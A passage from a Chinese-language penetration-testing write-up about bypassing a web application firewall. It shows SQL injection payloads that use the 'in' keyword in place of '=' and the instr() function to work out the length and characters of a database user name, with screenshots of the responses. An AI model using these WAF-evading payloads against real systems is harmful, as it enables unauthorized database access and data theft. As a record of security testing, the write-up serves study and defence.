这里我又跑了一遍字典，全404、500、403，期间尝试结合分块传输、参数污染、垃圾数据、白名单、高并发均未绕过去  
  
最终经过我的不断测试,插入下面payload回显特别慢，最终显示数据量太大，不过in这个关键字我理解的不是很透彻，有懂的师傅可以解答下  
```
'OR+1+in+1+and+'a'+in+'a

```  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QUC33bR4zdHib1qicUXvfLHplOZ6bluRGIwuiaOlLh1Xq6MXAPkDYutdz4zVPgpOnfoV2aCJstZIGZzanVMkGMG1UzTMN1fmsDRfM/640?wx_fmt=png&from=appmsg "")  
  
当1 in 5 的时候整个结果为false，返回为空  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QX5EVX0E8lUAxycXmMmXpWOylF8KcySriaqlwSdCg4901MdEmias0RUfzYf7qZRdn8jSMbUVKzEg5BSnVLibdRtroZdPnwBBnkIWE/640?wx_fmt=png&from=appmsg "")  
  
直接注下user的长度  
```
'OR+1+in+length(user)+and+'a'+in+'a

```  
  
只有相等时会卡死，很明显为7位  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QWmXP0w5OAUicwco9oE0ibHJ8hnq5bI6OR3EzDa75dWCwJqazksaINsazITRpX4b9OUMHECKLKE6vibwe1z2HcZWZGt7lagZLWZmY/640?wx_fmt=png&from=appmsg "")  
  
直接用instr函数注用户名  
```
'OR+1+in+instr(user,'u')+and+'a'+in+'a
instr函数代表后面那个字符在前面字符串第一次出现的位置
例如:
instr('user','u')返回1
instr('user','us')返回1
instr('user','s')返回2

```
